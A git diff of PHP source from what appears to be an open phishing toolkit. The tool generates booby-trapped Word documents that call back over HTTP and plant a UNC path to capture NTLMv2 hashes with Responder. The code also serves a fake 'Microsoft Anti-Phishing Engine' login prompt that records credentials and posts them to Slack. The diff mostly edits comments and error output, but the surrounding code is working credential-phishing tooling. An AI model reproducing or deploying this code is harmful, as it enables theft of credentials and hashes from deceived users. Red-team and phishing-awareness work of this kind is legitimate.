@@ -23,11 +23,13 @@ if ($conn->connect_error) {
 if(isset($_REQUEST['slackurl']) && $_REQUEST['slackurl'] != ""){$slackurl = $_REQUEST['slackurl'];
 }
 else
+// ------------------------ SET THIS WEBHOOK MANUALLY --------------------------------------------------------------------------
 {$slackurl = $SlackIncomingWebhookURL;}
 if(isset($_REQUEST['slackchannel']) && $_REQUEST['slackchannel'] != ""){$slackchannel = $_REQUEST['slackchannel']; $slackchannel = stripslashes($slackchannel);
 }
 $slackemoji = ":page_facing_up:";
 $slackbotname = "DocBot";
+// ------------------------ SET THIS MANUALLY ----------------------------------------------------------------------------------
 $APIResultsURL = $APIDomain."/phishingdocs/results";
 //$uniqueid = uniqid();
 
@@ -53,7 +55,7 @@ $uniqueid = $rowselect0["UUID"];
 }
 }
 
-printf($conn->error);
+//printf($conn->error);
 $conn->close();
 
 $conn0 = mysqli_connect($servername, $username, $password, $dbname);
@@ -75,7 +77,7 @@ if($row["Channel"] != ""){$slackchannel = $row["Channel"];}
 }
 }
 
-printf($conn0->error);
+//printf($conn0->error);
 $conn0->close();
 
 $conn2 = mysqli_connect($servername, $username, $password, $dbname);
@@ -109,7 +111,7 @@ while($row2 = $resultselect->fetch_assoc()) {
 $i = $i + 1;
 }
 
-printf($conn2->error);
+//printf($conn2->error);
 $conn2->close();
 
 $conn3 = mysqli_connect($servername, $username, $password, $dbname);
@@ -126,7 +128,8 @@ if (isset($_REQUEST['auth']) || $_SERVER['REQUEST_METHOD'] == "OPTIONS"){
 if (!isset($_SERVER['PHP_AUTH_USER'])) {
     header('WWW-Authenticate: Basic realm="Microsoft Anti-Phishing Engine"');
     header('HTTP/1.0 401 Unauthorized');
-    header('Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.template');
+//    header('Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.template');
+    header('Content-Type: text/plain; charset=utf-8');
     exit;
 } else {
 
@@ -143,7 +146,7 @@ $sqlinsert = "CALL InsertRequests('$ip','$target','$org','$useragent','$id','$ba
 $resultinsert = $conn3->query($sqlinsert);
 }
 
-printf($conn3->error);
+//printf($conn3->error);
 $conn3->close();
 
 // Prepares Message for Slack
@@ -432,8 +435,8 @@ $cmd16 = "sudo sudo zip -r Phishing.docx word/_rels/settings.xml.rels";
 exec($cmd16);
 
 $cmd17 = "sudo cp Phishing.docx Phishing".$now.".docx";
-exec($cmd17);    
-    
+exec($cmd17);
+
 }
 
 ?>
@@ -447,7 +450,7 @@ if($uploadOk == 1){
 <?php } else { ?>
 <form action="Phishing<?php echo $now; ?>.docx" method="get">
 <?php } ?>
-<button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i>Download</button>
+<button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i> Download</button>
 </form>
 </CENTER>
 <?php
@@ -473,7 +476,7 @@ else {
 </TD>
 </TR>
 </TABLE>
-<br><br><button class="btn"><i class="fa fa-download" type="submit"></i>Generate Payload!</button>
+<br><br><button class="btn"><i class="fa fa-download" type="submit"></i> Generate Payload!</button>
 </CENTER><br><br>
 <FONT SIZE="3" COLOR="#ffffff"><p align="center">The generated Word doc will call back via HTTP to the Slack API specified in the API's php file.  Also, a UNC path will be created as well in an attempt to capture NTLMv2 SMB requests.  Make sure your server allows TCP 445 and you're running Responder when the documents are opened for added fun! :)<br><br>If you don't trust me enough to provide your Slack Token (can't blame you!) you can serve your own by downloading the source code on my <a href="https://github.com/curtbraz/Phishing-API">Github</a> page!</p></FONT>
 </FORM>
